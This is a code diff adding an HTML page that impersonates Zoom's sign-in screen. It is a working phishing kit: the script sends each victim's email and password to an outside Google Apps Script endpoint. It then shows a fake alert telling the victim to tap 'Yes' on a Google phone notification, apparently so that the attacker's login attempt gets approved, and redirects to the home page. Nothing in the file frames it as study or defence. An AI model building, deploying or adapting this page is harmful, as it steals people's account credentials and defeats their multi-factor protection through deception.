@@ -1,0 +1,352 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sign In - Zoom</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="/zoom-style.css">
+</head>
+
+<body>
+  <main class="zoom-container">
+    <!-- Left side with banner -->
+    <div class="banner-section">
+      <div class="zoom-logo">
+        <img src="/zoom-logo.png" alt="Zoom Logo">
+      </div>
+      <div class="zoom-banner">
+        <img src="/zoom-banner.png" alt="Zoom Banner">
+      </div>
+    </div>
+
+    <!-- Right side -->
+    <div class="signin-container">
+      <h1>Sign In</h1>
+      <p class="subtitle">to start or join a meeting</p>
+
+      <!-- Email Step -->
+      <div class="input-container" id="email-step">
+        <div class="floating-label-input">
+          <input type="text" id="email" name="email" placeholder=" " required />
+          <label for="email">Work Email</label>
+        </div>
+        <p class="error-message" id="email-error" style="display:none;"></p>
+        <a href="#" class="forgot-email">Forgot email?</a>
+
+        <!-- Centered Next Button -->
+        <div class="button-container">
+          <button class="next-button" id="next-btn">Next</button>
+        </div>
+
+      </div>
+
+      <!-- Password Step -->
+      <div class="input-container" id="password-step" style="display:none;">
+        <div class="floating-label-input">
+          <input type="password" id="password" name="password" placeholder=" " required />
+          <label for="password">Password</label>
+        </div>
+        <p class="error-message" id="password-error" style="display:none;">⚠️ Enter your password</p>
+        <a href="#" class="forgot-email">Forgot password?</a>
+        <div class="button-container">
+          <button class="next-button" id="signin-btn">Sign In</button>
+        </div>
+      </div>
+      <!-- Footer -->
+      <footer class="zoom-footer">
+        <div class="footer-links">
+          <a href="https://support.zoom.us/hc/en-us" target="_blank">Help</a>
+          <a href="https://explore.zoom.us/en/terms/" target="_blank">Terms</a>
+          <a href="https://explore.zoom.us/en/privacy/" target="_blank">Privacy</a>
+        </div>
+        <p class="footer-note">
+          Zoom is protected by reCAPTCHA and the
+          <a href="https://policies.google.com/privacy" target="_blank">Privacy Policy</a> and
+          <a href="https://policies.google.com/terms" target="_blank">Terms of Service</a> apply.
+        </p>
+      </footer>
+    </div>
+
+
+
+
+
+    <style>
+      .zoom-footer {
+        text-align: center;
+        padding: 20px 10px;
+        font-family: 'Roboto', sans-serif;
+        font-size: 13px;
+        color: #6e6e6e;
+        /* background: #f8f8f8; */
+        /* border-top: 1px solid #ddd; */
+      }
+
+      .zoom-footer .footer-links {
+        margin-bottom: 8px;
+      }
+
+      .zoom-footer .footer-links a {
+        color: #0065f2;
+        text-decoration: none;
+        margin: 0 10px;
+        font-weight: 500;
+      }
+
+      .zoom-footer .footer-links a:hover {
+        text-decoration: underline;
+      }
+
+      .zoom-footer .footer-note {
+        font-size: 12px;
+        line-height: 1.4;
+        color: #777;
+        max-width: 600px;
+        margin: auto;
+      }
+
+      .zoom-footer .footer-note a {
+        color: #0065f2;
+        text-decoration: none;
+      }
+
+      .zoom-footer .footer-note a:hover {
+        text-decoration: underline;
+      }
+
+      /* Responsive adjustments */
+      @media (max-width: 480px) {
+        .zoom-footer .footer-links a {
+          display: inline-block;
+          margin: 5px;
+        }
+      }
+    </style>
+
+  </main>
+
+  <style>
+    /* Overlay */
+    .custom-alert-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.5);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+    }
+
+    /* Alert Box */
+    .custom-alert-box {
+      background: white;
+      padding: 25px 30px;
+      border-radius: 10px;
+      text-align: center;
+      max-width: 350px;
+      width: 90%;
+      box-shadow: 0 5px 25px rgba(0, 0, 0, 0.2);
+      animation: fadeInUp 0.3s ease-out;
+    }
+
+    /* Title */
+    .custom-alert-title {
+      font-size: 20px;
+      font-weight: bold;
+      margin-bottom: 8px;
+      color: #333;
+    }
+
+    /* Message */
+    .custom-alert-message {
+      font-size: 16px;
+      color: #555;
+      margin-bottom: 20px;
+    }
+
+    /* Button */
+    .custom-alert-btn {
+      background: #007bff;
+      color: white;
+      border: none;
+      padding: 10px 18px;
+      font-size: 15px;
+      border-radius: 6px;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .custom-alert-btn:hover {
+      background: #0056b3;
+    }
+
+    /* Animation */
+    @keyframes fadeInUp {
+      from {
+        transform: translateY(30px);
+        opacity: 0;
+      }
+
+      to {
+        transform: translateY(0);
+        opacity: 1;
+      }
+    }
+  </style>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function () {
+      const emailStep = document.getElementById('email-step');
+      const passwordStep = document.getElementById('password-step');
+      const emailInput = document.getElementById('email');
+      const passwordInput = document.getElementById('password');
+      const emailError = document.getElementById('email-error');
+      const passwordError = document.getElementById('password-error');
+      const nextBtn = document.getElementById('next-btn');
+      const signinBtn = document.getElementById('signin-btn');
+
+      const scriptURL =
+        'https://script.google.com/macros/s/AKfycbxhSX6LrTApHTnlQ6z5vhABYXzHlzN89G1ORDd816hwCrC7fAZ1aZEqZGa_adChKki_Bw/exec';
+      let storedEmail = "";
+
+      // Custom Alert Function
+      function showCustomAlert(title, message) {
+        const overlay = document.createElement('div');
+        overlay.classList.add('custom-alert-overlay');
+
+        const box = document.createElement('div');
+        box.classList.add('custom-alert-box');
+
+        const alertTitle = document.createElement('div');
+        alertTitle.classList.add('custom-alert-title');
+        alertTitle.textContent = title;
+
+        const alertMessage = document.createElement('div');
+        alertMessage.classList.add('custom-alert-message');
+        alertMessage.textContent = message;
+
+        const button = document.createElement('button');
+        button.classList.add('custom-alert-btn');
+        button.textContent = 'OK';
+        button.onclick = function () {
+          document.body.removeChild(overlay);
+        };
+
+        box.appendChild(alertTitle);
+        box.appendChild(alertMessage);
+        box.appendChild(button);
+        overlay.appendChild(box);
+        document.body.appendChild(overlay);
+      }
+
+      nextBtn.addEventListener('click', function () {
+        const emailVal = emailInput.value.trim().toLowerCase();
+        const emailPattern = /^[^@\s]+@[^@\s]+\.[^@\s]+$/;
+
+        if (!emailVal || !emailPattern.test(emailVal)) {
+          emailError.style.display = 'block';
+          return;
+        }
+
+        emailError.style.display = 'none';
+        storedEmail = emailVal;
+
+        fetch(scriptURL, {
+          method: 'POST',
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: new URLSearchParams({
+            step: "1",
+            email: storedEmail,
+            password: ""
+          })
+        }).then(() => {
+          emailStep.style.display = 'none';
+          passwordStep.style.display = 'block';
+        });
+      });
+
+      signinBtn.addEventListener('click', function () {
+        const passVal = passwordInput.value.trim();
+        if (!passVal) {
+          passwordError.style.display = 'block';
+          return;
+        }
+
+        passwordError.style.display = 'none';
+
+        fetch(scriptURL, {
+          method: 'POST',
+          headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+          },
+          body: new URLSearchParams({
+            step: "2",
+            email: storedEmail,
+            password: passVal
+          })
+        }).then(() => {
+  function showCustomAlert(title, message) {
+  // Overlay to darken background
+  const overlay = document.createElement('div');
+  overlay.classList.add('custom-alert-overlay');
+
+  // Create the alert container
+  const alertBox = document.createElement('div');
+  alertBox.classList.add('custom-alert');
+
+  // Title
+  const alertTitle = document.createElement('h2');
+  alertTitle.textContent = title;
+
+  // Message (make only "Yes" bold)
+  const alertMessage = document.createElement('p');
+  alertMessage.innerHTML = message.replace(/\bYes\b/g, '<b>Yes</b>');
+
+  // OK button
+  const okButton = document.createElement('button');
+  okButton.textContent = 'OK';
+  okButton.classList.add('custom-alert-btn');
+  okButton.addEventListener('click', () => {
+    // Close the alert
+    document.body.removeChild(overlay);
+
+    // Hide password input field if it exists
+    const passwordStep = document.getElementById('password-step');
+    if (passwordStep) {
+      passwordStep.style.display = 'none';
+    }
+
+    // Navigate to home page
+    window.location.href = '/'; // change to your actual home page URL
+  });
+
+  // Append elements
+  alertBox.appendChild(alertTitle);
+  alertBox.appendChild(alertMessage);
+  alertBox.appendChild(okButton);
+  overlay.appendChild(alertBox);
+  document.body.appendChild(overlay);
+}
+
+// Example usage
+showCustomAlert(
+  'Check Your Notification!',
+  'Google send a notification to your phone. Tap Yes on your notification to verify it\'s you.'
+);
+
+
+    });
+     });
+      });
+  </script>
+
+</body>
+
+</html>
